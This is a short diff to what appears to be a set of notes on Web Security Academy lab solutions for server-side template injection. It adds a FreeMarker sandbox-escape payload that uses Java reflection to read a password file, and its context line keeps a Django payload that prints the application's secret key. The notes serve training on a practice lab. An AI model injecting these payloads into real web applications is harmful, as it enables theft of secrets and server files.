@@ -73,3 +73,10 @@ https://0aaf00f80489691583e8258400b700a3.web-security-academy.net/?message=%7B%7
 ```python
 {{settings.SECRET_KEY}}
 ```
+
+
+## 6. Server-side template injection in a sandboxed environment
+
+```
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
+```
